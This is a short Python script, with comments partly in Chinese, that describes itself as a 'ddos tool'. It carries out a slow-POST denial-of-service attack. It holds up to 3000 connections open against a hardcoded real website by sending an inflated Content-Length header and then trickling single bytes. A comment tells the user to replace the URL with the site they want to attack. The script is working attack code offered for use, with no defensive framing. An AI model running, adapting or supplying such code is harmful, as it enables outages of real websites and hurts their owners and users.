import socket
import time
import threading

# Pressure Test,ddos tool
# ---------------------------
MAX_CONN = 3000
# 改写下面的网址为你想攻击的网站！！！！！！！！！
PORT = 80
HOST = "www.sanchijiangtang.com"  # input("server host:")
PAGE = "/tianfang-live2-web/index.html"  # input("server page:")
# ---------------------------

buf = ("POST %s HTTP/1.1\r\n"
       "Host: %s\r\n"
       "Content-Length: 114514\r\n"
       "Cookie: dklkt_dos_test\r\n"
       "\r\n" % (PAGE, HOST))
socks = []


def conn_thread():
    global socks
    while len(socks) < MAX_CONN:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((HOST, PORT))
            s.send(buf.encode('utf-8'))
            # print("[+] Send buf OK!,conn=%d\n" % len(socks))
            socks.append(s)
        except Exception as ex:
            print("[-] Could not connect to server or send error:%s" % ex)
            time.sleep(0.5)


# end def


def send_thread():
    global socks
    while (True):
        for s in socks:
            try:
                s.send("f".encode('utf-8'))
                #print ("[+] send OK! %s"%s)
            except Exception as ex:
                print("[-] send Exception:%s\n" % ex)
                socks.remove(s)
                s.close()
                time.sleep(0.5)


# end def

conn_th = threading.Thread(target=conn_thread, args=())
send_th = threading.Thread(target=send_thread, args=())
conn_th.start()
send_th.start()

while (1):
    print("存活连接数：%d" % len(socks))
    time.sleep(1)
